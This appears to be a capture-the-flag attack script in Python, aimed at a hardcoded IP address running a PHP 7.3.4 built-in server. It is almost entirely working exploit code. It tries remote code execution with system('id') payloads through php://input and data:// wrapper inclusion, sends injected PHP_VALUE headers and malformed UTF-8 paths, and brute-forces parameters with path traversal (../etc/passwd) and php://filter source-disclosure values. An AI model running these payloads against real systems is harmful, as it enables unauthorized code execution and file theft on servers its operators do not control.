#!/usr/bin/env python3
"""
Final attempt - comprehensive PHP 7.3.4 testing
Focus on built-in server specific behaviors
"""
import requests
import socket
import time
import struct

target = "http://61.147.171.35:51810"
target_host = "61.147.171.35"
target_port = 51810

def test_request_body_in_get():
    """PHP built-in server might process GET request bodies"""
    print("Testing GET request with body...")
    
    # Send GET request with body (unusual but sometimes works)
    raw = (
        b"GET /index.php HTTP/1.1\r\n"
        b"Host: 61.147.171.35:51810\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: 26\r\n"
        b"\r\n"
        b"<?php system('id'); ?>"
    )
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target_host, target_port))
        sock.send(raw)
        response = sock.recv(4096)
        sock.close()
        print(f"Response: {response}")
    except Exception as e:
        print(f"Error: {e}")

def test_php_input_stream():
    """Test php://input stream"""
    print("\nTesting php://input...")
    
    # If the code does something like include($_GET['file'])
    # We can try php://input
    
    payload = "<?php system('id'); ?>"
    urls = [
        f"{target}/?file=php://input",
        f"{target}/?page=php://input",
        f"{target}/?include=php://input",
        f"{target}/?f=php://input",
        f"{target}/index.php?file=php://input",
    ]
    
    for url in urls:
        try:
            r = requests.post(url, data=payload, timeout=5)
            if "uid=" in r.text:
                print(f"[+] RCE via {url}")
            elif r.text != "Hello World!\n":
                print(f"[?] {url}: {r.text[:50]}")
        except:
            pass

def test_data_uri():
    """Test data:// URI wrapper"""
    print("\nTesting data:// wrapper...")
    
    import base64
    
    payloads = [
        "data://text/plain,<?php phpinfo();?>",
        "data://text/plain;base64," + base64.b64encode(b"<?php phpinfo();?>").decode(),
    ]
    
    for payload in payloads:
        for param in ['file', 'page', 'include', 'f', 'path']:
            url = f"{target}/?{param}={payload}"
            try:
                r = requests.get(url, timeout=3)
                if "phpinfo" in r.text.lower() or "PHP Version" in r.text:
                    print(f"[+] data:// works: {param}")
            except:
                pass

def test_php_builtin_default_files():
    """Test default file handling in PHP built-in server"""
    print("\nTesting built-in server default files...")
    
    # PHP built-in server has specific file handling
    files = [
        "router.php",  # Common routing file
        ".htrouter.php",  # Alternative router
        "public/index.php",
        "web/index.php",
        "htdocs/index.php",
        "www/index.php",
        "src/index.php",
    ]
    
    for f in files:
        url = f"{target}/{f}"
        try:
            r = requests.get(url, timeout=3)
            if r.text != "Hello World!\n" and "Not Found" not in r.text:
                print(f"[?] {f}: {r.text[:50]}")
        except:
            pass

def test_fastcgi_simulation():
    """Send FastCGI-style parameters"""
    print("\nTesting FastCGI parameters...")
    
    # Some servers pass PHP_VALUE via headers
    headers = {
        "PHP_VALUE": "auto_prepend_file=php://input",
        "PHP_ADMIN_VALUE": "allow_url_include=1",
        "X-PHP-VALUE": "auto_prepend_file=php://input",
        "FCGI_PARAMS": "PHP_VALUE=test",
    }
    
    try:
        r = requests.post(target, headers=headers, data="<?php system('id'); ?>", timeout=5)
        if "uid=" in r.text:
            print("[+] FastCGI param injection works!")
        elif r.text != "Hello World!\n":
            print(f"[?] Different response: {r.text[:50]}")
    except:
        pass

def test_opcache_poison():
    """Test if OPcache can be poisoned"""
    print("\nTesting OPcache...")
    
    # This would require specific server configuration
    # Just a placeholder test
    pass

def test_broken_utf8():
    """Test with broken UTF-8 sequences"""
    print("\nTesting broken UTF-8...")
    
    # Broken UTF-8 might cause issues
    broken = [
        b"\x80",
        b"\xc0\x80",  # Overlong NUL
        b"\xe0\x80\x80",
        b"\xf0\x80\x80\x80",
        b"\xfe\xfe\xff\xff",
        b"\xc0\xaf",  # Overlong /
    ]
    
    for b in broken:
        try:
            url = target + "/" + b.decode('latin-1')
            r = requests.get(url, timeout=3)
            if "Hello World" not in r.text:
                print(f"[?] Broken UTF-8 caused different response")
        except:
            pass

def brute_force_get_params():
    """Brute force possible GET parameters"""
    print("\nBrute forcing GET parameters...")
    
    # Common CTF parameter names
    params = [
        'flag', 'admin', 'debug', 'source', 'src', 'backup',
        'show', 'view', 'display', 'output', 'print', 'echo',
        'dump', 'read', 'get', 'fetch', 'load', 'open',
        'cat', 'type', 'content', 'data', 'body', 'text',
        'php', 'phpinfo', 'info', 'version', 'ver', 'v',
        'shell', 'exec', 'cmd', 'command', 'run', 'system',
        'pass', 'password', 'pwd', 'key', 'secret', 'token',
        'user', 'username', 'name', 'login', 'auth',
        'include', 'require', 'file', 'path', 'dir', 'folder',
        'template', 'tpl', 'page', 'module', 'action', 'func',
        'id', 'no', 'num', 'number', 'index', 'i', 'n',
        # Single chars
        'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'x', 'y', 'z',
        '0', '1', '2', '3',
        # Underscore params
        '_', '__', '___', '_flag', '_admin', '_debug',
    ]
    
    # Values to try
    values = [
        '', '1', 'true', 'yes', 'on', 'flag', 'admin',
        'phpinfo()', 'system("id")', '../etc/passwd',
        'php://filter/convert.base64-encode/resource=index.php',
    ]
    
    for param in params:
        for value in values:
            url = f"{target}/?{param}={value}"
            try:
                r = requests.get(url, timeout=2)
                if r.text != "Hello World!\n" and "Hello World" not in r.text and "Not Found" not in r.text:
                    print(f"[+] Found: {param}={value}")
                    print(f"    Response: {r.text[:100]}")
                    return
            except:
                pass

def main():
    print(f"Target: {target}")
    print("=" * 60)
    
    test_request_body_in_get()
    test_php_input_stream()
    test_data_uri()
    test_php_builtin_default_files()
    test_fastcgi_simulation()
    test_broken_utf8()
    brute_force_get_params()
    
    print("\n" + "=" * 60)
    print("All tests completed.")

if __name__ == "__main__":
    main()
